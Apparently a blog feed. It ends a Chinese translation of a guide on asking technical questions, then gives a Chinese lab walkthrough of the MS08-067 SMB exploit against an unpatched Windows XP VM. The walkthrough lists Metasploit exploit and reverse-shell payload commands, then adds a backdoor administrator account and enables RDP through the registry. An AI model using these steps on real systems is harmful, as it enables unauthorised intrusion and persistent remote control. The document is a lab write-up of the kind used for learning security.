href="#清楚明确的表达你的问题以及需求" class="headerlink" title="清楚明确的表达你的问题以及需求"></a>清楚明确的表达你的问题以及需求</h3><p>漫无边际的提问是近乎无休无止的时间黑洞。最有可能给你有用答案的人通常也正是最忙的人（他们忙是因为要亲自完成大部分工作）。这样的人对无节制的时间黑洞相当厌恶，所以他们也倾向于厌恶那些漫无边际的提问。</p><p>如果你明确表述需要回答者做什么（如提供指点、发送一段代码、检查你的补丁、或是其他等等），就最有可能得到有用的答案。因为这会定出一个时间和精力的上限，便于回答者能集中精力来帮你。这么做很棒。</p><p>要理解专家们所处的世界，请把专业技能想像为充裕的资源，而回复的时间则是稀缺的资源。你要求他们奉献的时间越少，你越有可能从真正专业而且很忙的专家那里得到解答。</p><p>所以，界定一下你的问题，使专家花在辨识你的问题和回答所需要付出的时间减到最少，这技巧对你有用答案相当有帮助 —— 但这技巧通常和简化问题有所区别。因此，问<code>我想更好的理解 X，可否指点一下哪有好一点说明？</code>通常比问<code>你能解释一下 X 吗？</code>更好。如果你的代码不能运作，通常请别人看看哪里有问题，比要求别人替你改正要明智得多。</p><h3 id="询问有关代码的问题时"><a href="#询问有关代码的问题时" class="headerlink" title="询问有关代码的问题时"></a>询问有关代码的问题时</h3><p>别要求他人帮你调试有问题的代码，不提示一下应该从何入手。张贴几百行的代码，然后说一声：<code>它不能工作</code>会让你完全被忽略。只贴几十行代码，然后说一句：<code>在第七行以后，我期待它显示 &lt;x&gt;，但实际出现的是 &lt;y&gt;</code>比较有可能让你得到回应。</p><p>最有效描述程序问题的方法是提供最精简的 Bug 展示测试用例（bug-demonstrating test case）。什么是最精简的测试用例？那是问题的缩影；一小个程序片段能<strong>刚好</strong>展示出程序的异常行为，而不包含其他令人分散注意力的内容。怎么制作最精简的测试用例？如果你知道哪一行或哪一段代码会造成异常的行为，复制下来并加入足够重现这个状况的代码（例如，足以让这段代码能被编译/直译/被应用程序处理）。如果你无法将问题缩减到一个特定区块，就复制一份代码并移除不影响产生问题行为的部分。总之，测试用例越小越好（查看<a href="#话不在多而在精">话不在多而在精</a>一节）。</p><p>一般而言，要得到一段相当精简的测试用例并不太容易，但永远先尝试这样做的是种好习惯。这种方式可以帮助你了解如何自行解决这个问题 —— 而且即使你的尝试不成功，黑客们也会看到你在尝试取得答案的过程中付出了努力，这可以让他们更愿意与你合作。</p><p>如果你只是想让别人帮忙审查（Review）一下代码，在信的开头就要说出来，并且一定要提到你认为哪一部分特别需要关注以及为什么。</p><h3 id="别把自己家庭作业的问题贴上来"><a href="#别把自己家庭作业的问题贴上来" class="headerlink" title="别把自己家庭作业的问题贴上来"></a>别把自己家庭作业的问题贴上来</h3><p>黑客们很擅长分辨哪些问题是家庭作业式的问题；因为我们中的大多数都曾自己解决这类问题。同样，这些问题得由<strong>你</strong>来搞定，你会从中学到东西。你可以要求给点提示，但别要求得到完整的解决方案。</p><p>如果你怀疑自己碰到了一个家庭作业式的问题，但仍然无法解决，试试在使用者群组，论坛或（最后一招）在项目的<strong>使用者</strong>邮件列表或论坛中提问。尽管黑客们<strong>会</strong>看出来，但一些有经验的使用者也许仍会给你一些提示。</p><h3 id="去掉无意义的提问句"><a href="#去掉无意义的提问句" class="headerlink" title="去掉无意义的提问句"></a>去掉无意义的提问句</h3><p>避免用无意义的话结束提问，例如<code>有人能帮我吗？</code>或者<code>这有答案吗？</code>。</p><p>首先：如果你对问题的描述不是很好，这样问更是画蛇添足。</p><p>其次：由于这样问是画蛇添足，黑客们会很厌烦你 —— 而且通常会用逻辑上正确，但毫无意义的回答来表示他们的蔑视， 例如：<code>没错，有人能帮你</code>或者<code>不，没答案</code>。</p><p>一般来说，避免用 <code>是或否</code>、<code>对或错</code>、<code>有或没有</code>类型的问句，除非你想得到<a href="http://homepage.ntlworld.com./jonathan.deboynepollard/FGA/questions-with-yes-or-no-answers.html" target="_blank" rel="noopener">是或否类型的回答</a>。</p><h3 id="即使你很急也不要在标题写紧急"><a href="#即使你很急也不要在标题写紧急" class="headerlink" title="即使你很急也不要在标题写紧急"></a>即使你很急也不要在标题写<code>紧急</code></h3><p>这是你的问题，不是我们的。宣称<code>紧急</code>极有可能事与愿违：大多数黑客会直接删除无礼和自私地企图即时引起关注的问题。更严重的是，<code>紧急</code>这个字（或是其他企图引起关注的标题）通常会被垃圾信过滤器过滤掉 —— 你希望能看到你问题的人可能永远也看不到。</p><p>有半个例外的情况是，如果你是在一些很高调，会使黑客们兴奋的地方，也许值得这样去做。在这种情况下，如果你有时间压力，也很有礼貌地提到这点，人们也许会有兴趣回答快一点。</p><p>当然，这风险很大，因为黑客们兴奋的点多半与你的不同。譬如从 NASA 国际空间站（International Space Station）发这样的标题没有问题，但用自我感觉良好的慈善行为或政治原因发肯定不行。事实上，张贴诸如<code>紧急：帮我救救这个毛绒绒的小海豹！</code>肯定让你被黑客忽略或惹恼他们，即使他们认为毛绒绒的小海豹很重要。</p><p>如果你觉得这点很不可思议，最好再把这份指南剩下的内容多读几遍，直到你弄懂了再发文。</p><h3 id="礼多人不怪，而且有时还很有帮助"><a href="#礼多人不怪，而且有时还很有帮助" class="headerlink" title="礼多人不怪，而且有时还很有帮助"></a>礼多人不怪，而且有时还很有帮助</h3><p>彬彬有礼，多用<code>请</code>和<code>谢谢您的关注</code>，或<code>谢谢你的关照</code>。让大家都知道你对他们花时间免费提供帮助心存感激。</p><p>坦白说，这一点并没有比清晰、正确、精准并合法语法和避免使用专用格式重要（也不能取而代之）。黑客们一般宁可读有点唐突但技术上鲜明的 Bug 报告，而不是那种有礼但含糊的报告。（如果这点让你不解，记住我们是按问题能教给我们什么来评价问题的价值的）</p><p>然而，如果你有一串的问题待解决，客气一点肯定会增加你得到有用回应的机会。</p><p>（我们注意到，自从本指南发布后，从资深黑客那里得到的唯一严重缺陷反馈，就是对预先道谢这一条。一些黑客觉得<code>先谢了</code>意味着事后就不用再感谢任何人的暗示。我们的建议是要么先说<code>先谢了</code>，<strong>然后</strong>事后再对回复者表示感谢，或者换种方式表达感激，譬如用<code>谢谢你的关注</code>或<code>谢谢你的关照</code>。）</p><h3 id="问题解决后，加个简短的补充说明"><a href="#问题解决后，加个简短的补充说明" class="headerlink" title="问题解决后，加个简短的补充说明"></a>问题解决后，加个简短的补充说明</h3><p>问题解决后，向所有帮助过你的人发个说明，让他们知道问题是怎样解决的，并再一次向他们表示感谢。如果问题在新闻组或者邮件列表中引起了广泛关注，应该在那里贴一个说明比较恰当。</p><p>最理想的方式是向最初提问的话题回复此消息，并在标题中包含<code>已修正</code>，<code>已解决</code>或其它同等含义的明显标记。在人来人往的邮件列表里，一个看见讨论串<code>问题 X</code>和<code>问题 X - 已解决</code>的潜在回复者就明白不用再浪费时间了（除非他个人觉得<code>问题 X</code>的有趣），因此可以利用此时间去解决其它问题。</p><p>补充说明不必很长或是很深入；简单的一句<code>你好，原来是网线出了问题！谢谢大家 – Bill</code>比什么也不说要来的好。事实上，除非结论真的很有技术含量，否则简短可爱的小结比长篇大论更好。说明问题是怎样解决的，但大可不必将解决问题的过程复述一遍。</p><p>对于有深度的问题，张贴调试记录的摘要是有帮助的。描述问题的最终状态，说明是什么解决了问题，在此<strong>之后</strong>才指明可以避免的盲点。避免盲点的部分应放在正确的解决方案和其它总结材料之后，而不要将此信息搞成侦探推理小说。列出那些帮助过你的名字，会让你交到更多朋友。</p><p>除了有礼貌和有内涵以外，这种类型的补充也有助于他人在邮件列表/新闻群组/论坛中搜索到真正解决你问题的方案，让他们也从中受益。</p><p>至少，这种补充有助于让每位参与协助的人因问题的解决而从中得到满足感。如果你自己不是技术专家或者黑客，那就相信我们，这种感觉对于那些你向他们求助的大师或者专家而言，是非常重要的。问题悬而未决会让人灰心；黑客们渴望看到问题被解决。好人有好报，满足他们的渴望，你会在下次提问时尝到甜头。</p><p>思考一下怎样才能避免他人将来也遇到类似的问题，自问写一份文件或加个常见问题（FAQ）会不会有帮助。如果是的话就将它们发给维护者。</p><p>在黑客中，这种良好的后继行动实际上比传统的礼节更为重要，也是你如何透过善待他人而赢得声誉的方式，这是非常有价值的资产。</p><h2 id="如何解读答案"><a href="#如何解读答案" class="headerlink" title="如何解读答案"></a>如何解读答案</h2><p><a id="RTFM"></a></p><h3 id="RTFM-和-STFW：如何知道你已完全搞砸了"><a href="#RTFM-和-STFW：如何知道你已完全搞砸了" class="headerlink" title="RTFM 和 STFW：如何知道你已完全搞砸了"></a>RTFM 和 STFW：如何知道你已完全搞砸了</h3><p>有一个古老而神圣的传统：如果你收到<code>RTFM （Read The Fucking Manual）</code>的回应，回答者认为你<strong>应该去读他妈的手册</strong>。当然，基本上他是对的，你应该去读一读。</p><p>RTFM 有一个年轻的亲戚。如果你收到<code>STFW（Search The Fucking Web）</code>的回应，回答者认为你<strong>应该到他妈的网上搜索</strong>。那人多半也是对的，去搜索一下吧。（更温和一点的说法是 <strong><a href="http://lmgtfy.com/" target="_blank" rel="noopener">Google 是你的朋友</a></strong>！）</p><p>在论坛，你也可能被要求去爬爬论坛的旧文。事实上，有人甚至可能热心地为你提供以前解决此问题的讨论串。但不要依赖这种关照，提问前应该先搜索一下旧文。</p><p>通常，用这两句之一回答你的人会给你一份包含你需要内容的手册或者一个网址，而且他们打这些字的时候也正在读着。这些答复意味着回答者认为</p><ul><li><strong>你需要的信息非常容易获得</strong>；</li><li><strong>你自己去搜索这些信息比灌给你，能让你学到更多</strong>。</li></ul><p>你不应该因此不爽；<strong>依照黑客的标准，他已经表示了对你一定程度的关注，而没有对你的要求视而不见</strong>。你应该对他祖母般的慈祥表示感谢。</p><h3 id="如果还是搞不懂"><a href="#如果还是搞不懂" class="headerlink" title="如果还是搞不懂"></a>如果还是搞不懂</h3><p>如果你看不懂回应，别立刻要求对方解释。像你以前试着自己解决问题时那样（利用手册，FAQ，网络，身边的高手），先试着去搞懂他的回应。如果你真的需要对方解释，记得表现出你已经从中学到了点什么。</p><p>比方说，如果我回答你：<code>看来似乎是 zentry 卡住了；你应该先清除它。</code>，然后，这是一个<strong>很糟的</strong>后续问题回应：<code>zentry 是什么？</code> <strong>好</strong>的问法应该是这样：<code>哦~~~我看过说明了但是只有 -z 和 -p 两个参数中提到了 zentries，而且还都没有清楚的解释如何清除它。你是指这两个中的哪一个吗？还是我看漏了什么？</code></p><h3 id="处理无礼的回应"><a href="#处理无礼的回应" class="headerlink" title="处理无礼的回应"></a>处理无礼的回应</h3><p>很多黑客圈子中看似无礼的行为并不是存心冒犯。相反，它是直接了当，一针见血式的交流风格，这种风格更注重解决问题，而不是使人感觉舒服而却模模糊糊。</p><p>如果你觉得被冒犯了，试着平静地反应。如果有人真的做了出格的事，邮件列表、新闻群组或论坛中的前辈多半会招呼他。如果这<strong>没有</strong>发生而你却发火了，那么你发火对象的言语可能在黑客社区中看起来是正常的，而<strong>你</strong>将被视为有错的一方，这将伤害到你获取信息或帮助的机会。</p><p>另一方面，你偶尔真的会碰到无礼和无聊的言行。与上述相反，对真正的冒犯者狠狠地打击，用犀利的语言将其驳得体无完肤都是可以接受的。然而，在行事之前一定要非常非常的有根据。纠正无礼的言论与开始一场毫无意义的口水战仅一线之隔，黑客们自己莽撞地越线的情况并不鲜见。如果你是新手或外人，避开这种莽撞的机会并不高。如果你想得到的是信息而不是消磨时光，这时最好不要把手放在键盘上以免冒险。</p><p>（有些人断言很多黑客都有轻度的自闭症或亚斯伯格综合症，缺少用于润滑人类社会<strong>正常</strong>交往所需的神经。这既可能是真也可能是假的。如果你自己不是黑客，兴许你认为我们脑袋有问题还能帮助你应付我们的古怪行为。只管这么干好了，我们不在乎。我们<strong>喜欢</strong>我们现在这个样子，并且通常对病患标记都有站得住脚的怀疑）。</p><p>Jeff Bigler 的观察总结和这个相关也值得一读 (<strong><a href="http://www.mit.edu/~jcb/tact.html" target="_blank" rel="noopener">tact filters</a></strong>)。</p><p>在下一节，我们会谈到另一个问题，当<strong>你</strong>行为不当时所会受到的<code>冒犯</code>。</p><h2 id="如何避免扮演失败者"><a href="#如何避免扮演失败者" class="headerlink" title="如何避免扮演失败者"></a>如何避免扮演失败者</h2><p>在黑客社区的论坛中有那么几次你可能会搞砸 —— 以本指南所描述到的或类似的方式。而你会在公开场合中被告知你是如何搞砸的，也许攻击的言语中还会带点夹七夹八的颜色。</p><p>这种事发生以后，你能做的最糟糕的事莫过于哀嚎你的遭遇、宣称被口头攻击、要求道歉、高声尖叫、憋闷气、威胁诉诸法律、向其雇主报怨、忘了关马桶盖等等。相反地，你该这么做：</p><p>熬过去，这很正常。事实上，它是有益健康且合理的。</p><p>社区的标准不会自行维持，它们是通过参与者积极而<strong>公开地</strong>执行来维持的。不要哭嚎所有的批评都应该通过私下的邮件传送，它不是这样运作的。当有人评论你的一个说法有误或者提出不同看法时，坚持声称受到个人攻击也毫无益处，这些都是失败者的态度。</p><p>也有其它的黑客论坛，受过高礼节要求的误导，禁止参与者张贴任何对别人帖子挑毛病的消息，并声称<code>如果你不想帮助用户就闭嘴。</code> 结果造成有想法的参与者纷纷离开，这么做只会使它们沦为毫无意义的唠叨与无用的技术论坛。</p><p>夸张的讲法是：你要的是“友善”（以上述方式）还是有用？两个里面挑一个。</p><p>记着：当黑客说你搞砸了，并且（无论多么刺耳）告诉你别再这样做时，他正在为关心<strong>你</strong>和<strong>他的社区</strong>而行动。对他而言，不理你并将你从他的生活中滤掉更简单。如果你无法做到感谢，至少要表现得有点尊严，别大声哀嚎，也别因为自己是个有戏剧性超级敏感的灵魂和自以为有资格的新来者，就指望别人像对待脆弱的洋娃娃那样对你。</p><p>有时候，即使你没有搞砸（或者只是在他的想像中你搞砸了），有些人也会无缘无故地攻击你本人。在这种情况下，抱怨倒是<strong>真的</strong>会把问题搞砸。</p><p>这些来找麻烦的人要么是毫无办法但自以为是专家的不中用家伙，要么就是测试你是否真会搞砸的心理专家。其它读者要么不理睬，要么用自己的方式对付他们。这些来找麻烦的人在给他们自己找麻烦，这点你不用操心。</p><p>也别让自己卷入口水战，最好不要理睬大多数的口水战 – 当然，这是在你检验它们只是口水战，并且未指出你有搞砸的地方，同时也没有巧妙地将问题真正的答案藏于其后（这也是有可能的）。</p><h2 id="不该问的问题"><a href="#不该问的问题" class="headerlink" title="不该问的问题"></a>不该问的问题</h2><p>以下是几个经典蠢问题，以及黑客没回答时心中所想的：</p><p>问题：<a href="#q1">我能在哪找到 X 程序或 X 资源？</a></p><p>问题：<a href="#q2">我怎样用 X 做 Y？</a></p><p>问题：<a href="#q3">如何设定我的 shell 提示？</a></p><p>问题：<a href="#q4">我可以用 Bass-o-matic 文件转换工具将 AcmeCorp 档案转换为 TeX 格式吗？</a></p><p>问题：<a href="#q5">我的程序/设定/SQL 语句没有用</a></p><p>问题：<a href="#q6">我的 Windows 电脑有问题，你能帮我吗？</a></p><p>问题：<a href="#q7">我的程序不会动了，我认为系统工具 X 有问题</a></p><p>问题：<a href="#q8">我在安装 Linux（或者 X ）时有问题，你能帮我吗？</a></p><p>问题：<a href="#q9">我怎么才能破解 root 帐号/窃取 OP 特权/读别人的邮件呢？</a></p><hr><p><a id="q1"></a></p><blockquote><p>问题：我能在哪找到 X 程序或 X 资源？</p></blockquote><p>回答：就在我找到它的地方啊，白痴 —— 搜索引擎的那一头。天哪！难道还有人不会用 <a href="http://www.google.com" target="_blank" rel="noopener">Google</a> 吗？</p><p><a id="q2"></a></p><blockquote><p>问题：我怎样用 X 做 Y？</p></blockquote><p>回答：如果你想解决的是 Y ，提问时别给出可能并不恰当的方法。这种问题说明提问者不但对 X 完全无知，也对 Y 要解决的问题糊涂，还被特定形势禁锢了思维。最好忽略这种人，等他们把问题搞清楚了再说。</p><p><a id="q3"></a></p><blockquote><p>问题：如何设定我的 shell 提示？？</p></blockquote><p>回答：如果你有足够的智慧提这个问题，你也该有足够的智慧去 <a href="#RTFM">RTFM</a>，然后自己去找出来。</p><p><a id="q4"></a></p><blockquote><p>问题：我可以用 Bass-o-matic 文件转换工具将 AcmeCorp 档案转换为 TeX 格式吗？</p></blockquote><p>回答：试试看就知道了。如果你试过，你既知道了答案，就不用浪费我的时间了。</p><p><a id="q5"></a></p><blockquote><p>问题：我的{程序/设定/SQL 语句}不工作</p></blockquote><p>回答：这不算是问题吧，我对要我问你二十个问题才找得出你真正问题的问题没兴趣 —— 我有更有意思的事要做呢。在看到这类问题的时候，我的反应通常不外如下三种</p><ul><li>你还有什么要补充的吗？</li><li>真糟糕，希望你能搞定。</li><li>这关我有什么屁事？</li></ul><p><a id="q6"></a></p><blockquote><p>问题：我的 Windows 电脑有问题，你能帮我吗？</p></blockquote><p>回答：能啊，扔掉微软的垃圾，换个像 Linux 或 BSD 的开源操作系统吧。</p><p>注意：如果程序有官方版 Windows 或者与 Windows 有互动（如 Samba），你<strong>可以</strong>问与 Windows 相关的问题， 只是别对问题是由 Windows 操作系统而不是程序本身造成的回复感到惊讶， 因为 Windows 一般来说实在太烂，这种说法通常都是对的。</p><p><a id="q7"></a></p><blockquote><p>问题：我的程序不会动了，我认为系统工具 X 有问题</p></blockquote><p>回答：你完全有可能是第一个注意到被成千上万用户反复使用的系统调用与函数库档案有明显缺陷的人，更有可能的是你完全没有根据。不同凡响的说法需要不同凡响的证据，当你这样声称时，你必须有清楚而详尽的缺陷说明文件作后盾。</p><p><a id="q8"></a></p><blockquote><p>问题：我在安装 Linux（或者 X ）时有问题，你能帮我吗？</p></blockquote><p>回答：不能，我只有亲自在你的电脑上动手才能找到毛病。还是去找你当地的 Linux 使用群组者寻求实际的指导吧（你能在<a href="http://www.linux.org/groups/index.html" target="_blank" rel="noopener">这儿</a>找到使用者群组的清单）。</p><p>注意：如果安装问题与某 Linux 的发行版有关，在它的邮件列表、论坛或本地使用者群组中提问也许是恰当的。此时，应描述问题的准确细节。在此之前，先用 <code>Linux</code> 和<strong>所有</strong>被怀疑的硬件作关键词仔细搜索。</p><p><a id="q9"></a></p><blockquote><p>问题：我怎么才能破解 root 帐号/窃取 OP 特权/读别人的邮件呢？</p></blockquote><p>回答：想要这样做，说明了你是个卑鄙小人；想找个黑客帮你，说明你是个白痴！</p><h2 id="好问题与蠢问题"><a href="#好问题与蠢问题" class="headerlink" title="好问题与蠢问题"></a>好问题与蠢问题</h2><p>最后，我将透过举一些例子，来说明怎样聪明的提问；同一个问题的两种问法被放在一起，一种是愚蠢的，另一种才是明智的。</p><p><strong>蠢问题</strong>：</p><blockquote><p>我可以在哪儿找到关于 Foonly Flurbamatic 的资料？</p></blockquote><p>这种问法无非想得到 <a href="#RTFM">STFW</a> 这样的回答。</p><p><strong>聪明问题</strong>：</p><blockquote><p>我用 Google 搜索过 “Foonly Flurbamatic 2600”，但是没找到有用的结果。谁知道上哪儿去找对这种设备编程的资料？</p></blockquote><p>这个问题已经 STFW 过了，看起来他真的遇到了麻烦。</p><p><strong>蠢问题</strong>：</p><blockquote><p>我从 foo 项目找来的源码没法编译。它怎么这么烂？</p></blockquote><p>他觉得都是别人的错，这个傲慢自大的提问者。</p><p><strong>聪明问题</strong>：</p><blockquote><p>foo 项目代码在 Nulix 6.2 版下无法编译通过。我读过了 FAQ，但里面没有提到跟 Nulix 有关的问题。这是我编译过程的记录，我有什么做的不对的地方吗？</p></blockquote><p>提问者已经指明了环境，也读过了 FAQ，还列出了错误，并且他没有把问题的责任推到别人头上，他的问题值得被关注。</p><p><strong>蠢问题</strong>：</p><blockquote><p>我的主机板有问题了，谁来帮我？</p></blockquote><p>某黑客对这类问题的回答通常是：<code>好的，还要帮你拍拍背和换尿布吗？</code>，然后按下删除键。</p><p><strong>聪明问题</strong>：</p><blockquote><p>我在 S2464 主机板上试过了 X 、 Y 和 Z ，但没什么作用，我又试了 A 、 B 和 C 。请注意当我尝试 C 时的奇怪现象。显然 florbish 正在 grommicking，但结果出人意料。通常在 Athlon MP 主机板上引起 grommicking 的原因是什么？有谁知道接下来我该做些什么测试才能找出问题？</p></blockquote><p>这个家伙，从另一个角度来看，值得去回答他。他表现出了解决问题的能力，而不是坐等天上掉答案。</p><p>在最后一个问题中，注意<code>告诉我答案</code>和<code>给我启示，指出我还应该做什么诊断工作</code>之间微妙而又重要的区别。</p><p>事实上，后一个问题源自于 2001 年 8 月在 Linux 内核邮件列表（lkml）上的一个真实的提问。我（Eric）就是那个提出问题的人。我在 Tyan S2464 主板上观察到了这种无法解释的锁定现象，列表成员们提供了解决这一问题的重要信息。</p><p>通过我的提问方法，我给了别人可以咀嚼玩味的东西；我设法让人们很容易参与并且被吸引进来。我显示了自己具备和他们同等的能力，并邀请他们与我共同探讨。通过告诉他们我所走过的弯路，以避免他们再浪费时间，我也表明了对他们宝贵时间的尊重。</p><p>事后，当我向每个人表示感谢，并且赞赏这次良好的讨论经历的时候， 一个 Linux 内核邮件列表的成员表示，他觉得我的问题得到解决并非由于我是这个列表中的<strong>名</strong>人，而是因为我用了正确的方式来提问。</p><p>黑客从某种角度来说是拥有丰富知识但缺乏人情味的家伙；我相信他是对的，如果我<strong>像</strong>个乞讨者那样提问，不论我是谁，一定会惹恼某些人或者被他们忽视。他建议我记下这件事，这直接导致了本指南的出现。</p><h2 id="如果得不到回答"><a href="#如果得不到回答" class="headerlink" title="如果得不到回答"></a>如果得不到回答</h2><p>如果仍得不到回答，请不要以为我们觉得无法帮助你。有时只是看到你问题的人不知道答案罢了。没有回应不代表你被忽视，虽然不可否认这种差别很难区分。</p><p>总的来说，简单的重复张贴问题是个很糟的点子。这将被视为无意义的喧闹。有点耐心，知道你问题答案的人可能生活在不同的时区，可能正在睡觉，也有可能你的问题一开始就没有组织好。</p><p>你可以通过其他渠道获得帮助，这些渠道通常更适合初学者的需要。</p><p>有许多网上的以及本地的使用者群组，由热情的软件爱好者（即使他们可能从没亲自写过任何软件）组成。通常人们组建这样的团体来互相帮助并帮助新手。</p><p>另外，你可以向很多商业公司寻求帮助，不论公司大还是小。别为要付费才能获得帮助而感到沮丧！毕竟，假使你的汽车发动机汽缸密封圈爆掉了 —— 完全可能如此 —— 你还得把它送到修车铺，并且为维修付费。就算软件没花费你一分钱，你也不能强求技术支持总是免费的。</p><p>对像是 Linux 这种大众化的软件，每个开发者至少会对应到上万名使用者。根本不可能由一个人来处理来自上万名使用者的求助电话。要知道，即使你要为这些协助付费，和你所购买的同类软件相比，你所付出的也是微不足道的（通常封闭源代码软件的技术支持费用比开源软件的要高得多，且内容也没那么丰富）。</p><h2 id="如何更好地回答问题"><a href="#如何更好地回答问题" class="headerlink" title="如何更好地回答问题"></a>如何更好地回答问题</h2><p><strong>态度和善一点</strong>。问题带来的压力常使人显得无礼或愚蠢，其实并不是这样。</p><p><strong>对初犯者私下回复</strong>。对那些坦诚犯错之人没有必要当众羞辱，一个真正的新手也许连怎么搜索或在哪找常见问题都不知道。</p><p><strong>如果你不确定，一定要说出来</strong>！一个听起来权威的错误回复比没有还要糟，别因为听起来像个专家很好玩，就给别人乱指路。要谦虚和诚实，给提问者与同行都树个好榜样。</p><p><strong>如果帮不了忙，也别妨碍他</strong>。不要在实际步骤上开玩笑，那样也许会毁了使用者的设置 —— 有些可怜的呆瓜会把它当成真的指令。</p><p><strong>试探性的反问以引出更多的细节</strong>。如果你做得好，提问者可以学到点东西 —— 你也可以。试试将蠢问题转变成好问题，别忘了我们都曾是新手。</p><p>尽管对那些懒虫抱怨一声 RTFM 是正当的，能指出文件的位置（即使只是建议个 Google 搜索关键词）会更好。</p><p><strong>如果你决定回答，就请给出好的答案</strong>。当别人正在用错误的工具或方法时别建议笨拙的权宜之计（wordaround），应推荐更好的工具，重新界定问题。</p><p><strong>正面的回答问题</strong>！如果这个提问者已经很深入的研究而且也表明已经试过 X 、 Y 、 Z 、 A 、 B 、 C 但没得到结果，回答 <code>试试看 A 或是 B</code> 或者 <code>试试 X 、 Y 、 Z 、 A 、 B 、 C</code> 并附上一个链接一点用都没有。</p><p><strong>帮助你的社区从问题中学习</strong>。当回复一个好问题时，问问自己<code>如何修改相关文件或常见问题文件以免再次解答同样的问题？</code>，接着再向文件维护者发一份补丁。</p><p>如果你是在研究一番后才做出的回答，<strong>展现你的技巧而不是直接端出结果</strong>。毕竟<code>授人以鱼不如授人以渔</code>。</p><h2 id="相关资源"><a href="#相关资源" class="headerlink" title="相关资源"></a>相关资源</h2><p>如果你需要个人电脑、Unix 系统和网络如何运作的基础知识，参阅 <a href="http://en.tldp.org/HOWTO/Unix-and-Internet-Fundamentals-HOWTO/" target="_blank" rel="noopener">Unix 系统和网络基本原理</a>。</p><p>当你发布软件或补丁时，试着按<a href="http://en.tldp.org/HOWTO/Software-Release-Practice-HOWTO/index.html" target="_blank" rel="noopener">软件发布实践</a>操作。</p><h2 id="鸣谢"><a href="#鸣谢" class="headerlink" title="鸣谢"></a>鸣谢</h2><p>Evelyn Mitchel 贡献了一些愚蠢问题例子并启发了编写<code>如何更好地回答问题</code>这一节， Mikhail Ramendik 贡献了一些特别有价值的建议和改进。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ms08_067经典漏洞复现</title>
    <link href="/2020/03/10/dig2/"/>
    <url>/2020/03/10/dig2/</url>
    
    <content type="html"><![CDATA[<blockquote><p>不要理会下面那句虎狼之词，继续搬运</p></blockquote><blockquote><p>我竟然把这个坑填下去了，可喜可贺。(填下去个锤子！from半年后的自己)</p></blockquote><h2 id="一切的开始"><a href="#一切的开始" class="headerlink" title="一切的开始"></a>一切的开始</h2><blockquote><p>刑法第二百八十六条违反国家规定，对计算机信息系统功能进行删除、修改、增加、干扰，造成计算机信息系统不能正常运行，后果严重的，处五年以下有期徒刑或者拘役;后果特别严重的，处五年以上有期徒刑。违反国家规定，对计算机信息系统中存储、处理或者传输的数据和应用程序进行删除、修改、增加的操作，后果严重的，依照前款的规定处罚。故意制作、传播计算机病毒等破坏性程序，影响计算机系统正常运行，后果严重的，依照第一款的规定处罚。</p></blockquote><p>一定要清楚，我们做的是安全，一切的目的是更好的保护自己和他人。切记，切记！</p><h2 id="ms08-067"><a href="#ms08-067" class="headerlink" title="ms08_067"></a>ms08_067</h2><p>ms08_067是微软win操作系统中存在的一个服务器服务漏洞，在win server2008之前的系统都会受这个漏洞影响，黑客可以利用这个漏洞控制目标系统。</p><h2 id="操作概述"><a href="#操作概述" class="headerlink" title="操作概述"></a>操作概述</h2><p>使用kali linux攻击机对win xp系统利用此漏洞进行攻击，在靶机上建立管理员账号并远程控制靶机。</p><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>kali linux攻击机（上一篇博客提到过）</p><p>win xp sp3 english（纯净版，不带任何补丁）</p><h2 id="控制靶机"><a href="#控制靶机" class="headerlink" title="控制靶机"></a>控制靶机</h2><p>进入kali终端，输入以下命令运行msf：</p><blockquote><p>msfconsole</p></blockquote><p>寻找并Ent使用模块</p><p>我们要找的是ms08_067漏洞，所以我们首先寻找此漏洞</p><blockquote><p>search ms08_067_netapi</p></blockquote><p>我们找到漏洞后，使用此漏洞</p><blockquote><p>use exploit/windows/smb/ms08_067_netapi</p></blockquote><p>加载攻击载体</p><p>攻击载体有很多，我们这次使用shell_reverse_tcp（如果对渗透后攻击有想法的推荐Meterpreter）</p><blockquote><p>set payload generic/shell_reverse_tcp </p></blockquote><p>设置ip</p><p>LHOST为攻击机ip，RHOST为靶机ip，例如：</p><blockquote><p>set LHOST 192.168.1.62</p></blockquote><p>寻找对应版本target</p><p>target需要与靶机系统版本对应，在不确定版本时设置target为0也可自动选择</p><blockquote><p>set target 0</p></blockquote><p>运行</p><blockquote><p>exploit</p></blockquote><p>到此，我们就进入了靶机系统，你的kali Terminal应该显示以下信息。<br><a href="https://imgchr.com/i/8Progs" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/03/10/8Progs.md.png" srcset="/img/loading.gif" alt="8Progs.png" border="0" /></a></p><h2 id="远程桌面连接"><a href="#远程桌面连接" class="headerlink" title="远程桌面连接"></a>远程桌面连接</h2><p>接下来，我们尝试在靶机上创建账户并使用远程桌面连接靶机，</p><p>首先，我们创建一个账户。</p><blockquote><p>user net host-name password /add</p></blockquote><p>提升为管理员权限</p><blockquote><p>net localgroup administrators host-name /add</p></blockquote><p>winxp远程操控端口为3389，我们将这个端口打开</p><blockquote><p>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</p></blockquote><p>使用netstat查看端口</p><blockquote><p>netstat -an</p></blockquote><p>这时，我们会发现3389端口处于开启状态。</p><p>然后，我们可以用局域网内的计算机远程桌面连接到靶机，win10运行——&gt;MSTSC。</p><p>以上就是ms08_067漏洞利用复现的全过程。</p><h2 id="问题记录"><a href="#问题记录" class="headerlink" title="问题记录"></a>问题记录</h2><h3 id="访问445端口被拒绝"><a href="#访问445端口被拒绝" class="headerlink" title="访问445端口被拒绝"></a>访问445端口被拒绝</h3><p>装了445端口补丁的winxp将445端口停用，所以复现此例程时不要使用带补丁的win xp。</p><p>还有可能是因为靶机打开了防火墙，复现时需要将防火墙关闭。</p><h3 id="设置target"><a href="#设置target" class="headerlink" title="设置target"></a>设置target</h3><p>如果不设置target，将不会判断靶机的系统版本进行攻击。建议将target设置为0，target为0时会自动判断靶机系统版本攻击。</p><h2 id="没过瘾？"><a href="#没过瘾？" class="headerlink" title="没过瘾？"></a>没过瘾？</h2><p>msf上有很多类似的漏洞攻击，如果没过瘾的话可以多google，多尝试，毕竟ms08_067过于古老，趣味性一般，想玩得更嗨的话我推荐ms17_010 EternalBlue（中文译名:永恒之蓝）</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>winxp上的漏洞其实还有很多，感兴趣的同学可以查一下其他的漏洞并尝试复现，折腾永不停止！</p>]]></content>
    
    
    <categories>
      
      <category>渗透攻击实战</category>
